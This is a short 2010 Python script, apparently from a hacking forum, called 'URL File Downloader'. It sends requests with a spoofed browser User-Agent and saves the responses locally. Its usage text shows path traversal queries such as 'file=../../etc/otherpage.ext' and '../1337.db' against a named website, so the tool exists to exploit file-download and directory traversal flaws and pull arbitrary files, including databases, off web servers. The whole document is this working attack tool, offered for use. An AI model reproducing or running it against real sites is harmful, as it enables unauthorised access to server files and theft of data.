#! /usr/bin/env python3.1
# 09.06.2010 <> 09.06.2010 | cmiN
# URL File Downloader

import sys, urllib.request

def main(args):
    usage = """\t\t URL File Downloader 1.0

\t Usage: source.ext host path query

Where host  -> http://www.site.com
      path  -> folder/page.ext
      query -> file=../../etc/otherpage.ext

\t Example: ufd.py http://rstcenter.com index.php ../1337.db"""
    try:
        print("Please wait...")
        if len(args) == 4:
            process(args[1], args[2], args[3])
        else:
            print(usage)
    except Exception as message:
        print("An error occurred: {}".format(message))
    except:
        print("Unknown error.")
    else:
        print("Ready!")

def process(host, path, query):
    url = "{h}/{p}?{q}".format(h=host.strip("/"), p=path.strip("/?"), q=query.strip("/"))
    dfname = query.split("/")[-1]
    headers = {"User-Agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.6) Gecko/2009020911 Ubuntu/8.04 (hardy) Firefox/3.0.6"}
    request = urllib.request.Request(url, headers=headers)
    with open(dfname, "wb") as fout, urllib.request.urlopen(request) as fin:
        fout.write(fin.read())

if __name__ == "__main__":
    main(sys.argv)
